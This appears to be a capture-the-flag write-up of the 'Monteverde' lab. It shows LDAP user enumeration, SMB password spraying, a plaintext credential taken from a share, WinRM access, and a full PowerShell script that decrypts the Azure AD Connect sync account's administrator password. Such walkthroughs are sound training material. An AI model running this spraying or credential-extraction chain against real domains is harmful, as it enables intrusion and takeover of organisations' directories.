## Monteverde

### Lab Details 

- Difficulty: Medium
- Type: Brute Force, Azure AD, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
```
- get domain users with `windapsearch`
```bash
$ python windapsearch.py -u "" --dc-ip 10.129.228.111 -U --admin-objects
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.228.111
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 10 users: 

cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL

cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL

cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL

cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL

cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL

cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL

cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL

[+] Attempting to enumerate all admin (protected) objects
[+]	Found 0 Admin Objects:


[*] Bye!
```
- get users with `winrm` access
```bash
$ python windapsearch.py -u "" --dc-ip 10.129.228.111 -U -m "Remote Management Users"
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.228.111
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 10 users: 

cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL

cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL

cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL

cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL

cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL

cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL

cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL

[+] Attempting to enumerate full DN for group: Remote Management Users
[+]	 Using DN: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL

[+]	 Found 1 members:

b'CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL'

[*] Bye!
```
#### Initial Foothold 
- load the usernames to a file and extra only the username portion
```bash
$ users
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```
- download a [password list](https://github.com/insidetrust/statistically-likely-usernames/raw/refs/heads/master/weak-corporate-passwords/english-basic.txt) and combine with the usernames 
```
$ cat english-basic.txt 
Password1
Welcome1
Letmein1
Password123
Welcome123
Letmein123
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```
- perform a brute force attacking via `nxc` 
- and we get user `SABatchJobs:SABatchJobs`
```bash
$ nxc smb 10.129.228.111 -d megabank -u users -p english-basic.txt
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\SABatchJobs:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-ata:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-bexec:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-netapp:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\dgalanos:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\roleary:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\smorgan:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\SABatchJobs:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-ata:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-bexec:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-netapp:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\dgalanos:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\roleary:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\smorgan:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\SABatchJobs:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-ata:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-bexec:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-netapp:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\dgalanos:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\roleary:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\smorgan:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\SABatchJobs:Password123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-ata:Password123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-bexec:Password123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-netapp:Password123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\dgalanos:Password123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\roleary:Password123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\smorgan:Password123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\SABatchJobs:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-ata:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-bexec:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-netapp:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\dgalanos:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\roleary:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\smorgan:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\SABatchJobs:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-ata:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-bexec:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\svc-netapp:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\dgalanos:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\roleary:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] megabank\smorgan:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [+] megabank\SABatchJobs:SABatchJobs
```
- use `smbmap` to enumerate permissions over the shares
- user `SABatchJobs` has read permission over `users$ & azure_uploads`
```bash
$ smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.129.228.111
[+] IP: 10.129.228.111:445	Name: megabank.local                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY	
```
- nothing is in `azure_uploads` and we can get a `xml` file that's containing user `mhope`'s credential
```bash
$ smbclient //10.129.228.111/users$ -U SABatchJobs
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \mhope\azure.xml of size 1212 as mhope/azure.xml (47.3 KiloBytes/sec) (average 47.3 KiloBytes/sec)
smb: \> exit

$ cat mhope/azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
- check user exists with `nxc`
```bash
$ nxc smb 10.129.228.111 -d megabank -u mhope -p '4n0therD4y@n0th3r$'
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] megabank\mhope:4n0therD4y@n0th3r$
```
- we use `evil-winrm` to get reverse shell access to target

#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `winPEASx86.exe`
- found that target is potentially running Azure AD services 
- found cloud credentials file but it's nothing hold anything of interest
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\mhope\.azure\TokenCache.dat (Azure Token Cache)
    Accessed:1/3/2020 5:36:14 AM -- Size:7896

    C:\Users\mhope\.azure\AzureRMContext.json (Azure RM Context)
    Accessed:1/3/2020 5:35:57 AM -- Size:2794
```
- AD apps and services
```powershell
## some azure services/apps
*Evil-WinRM* PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
```
- Azure AD Sync is installed on the target 
- search online found [blog post](https://blog.xpnsec.com/azuread-connect-for-redteam/) on how to exploit the install app
- get the [script](https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/d45633c954ee3d40be1bff82648750f516cd3b80/azuread_decrypt_msol.ps1) from the blog
- running the script directly will not get us anything so we will need perform some manual tasks
- getting the encrypted password 
```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
Changed database context to 'ADSync'.
instance_id                          keyset_id   entropy
------------------------------------ ----------- ------------------------------------
1852B527-DD4F-4ECF-B541-EFCCBFF29E31           1 194EC2FC-F186-46CF-B44D-071EB61F49CD

(1 rows affected)
```
- below is updated script 
```powershell
Function Get-ADConnectPassword{
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
$key_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
}
```
- load the script to target and import the function
- run the function and we get the admin password
```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> upload decrypt.ps1
                                        
Info: Uploading /home/ch4os1/smb/decrypt.ps1 to C:\Users\mhope\Documents\decrypt.ps1
                                        
Data: 2148 bytes of 2148 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\mhope\Documents> . ./decrypt.ps1
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-ADConnectPassword
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```
#### Resources

#### Lesson Learned
- AAD password dump via AD Sync